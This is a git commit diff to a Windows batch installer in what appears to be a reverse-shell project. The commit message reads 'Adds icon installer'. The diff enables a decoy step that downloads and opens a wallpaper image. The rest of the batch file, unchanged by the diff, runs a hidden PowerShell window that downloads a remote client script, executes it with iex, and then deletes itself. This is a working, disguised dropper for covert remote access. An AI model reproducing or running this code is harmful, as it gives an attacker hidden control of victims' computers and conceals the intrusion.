8fa83106be83036146f8fd07d6f094e55ecf7b29
Kevin LOCATI <kevin.locati@gmail.com>
2015-04-16 23:21:18 +0200

    Adds icon installer

--- installers/install.bat
+++ installers/install.bat
@@ -1,6 +1,6 @@
 @echo off
 set scriptURL=https://raw.githubusercontent.com/sweetsoftware/ReversePowershell/master/client.ps1
-rem powershell -c "Invoke-WebRequest http://www.picturesnew.com/media/images/picture-wallpaper.jpg -OutFile ./pic.jpg"
-rem pic.jpg
+powershell -c "Invoke-WebRequest http://www.picturesnew.com/media/images/picture-wallpaper.jpg -OutFile ./pic.jpg"
+pic.jpg
 powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString('%scriptURL%')"
 del "%~f0"
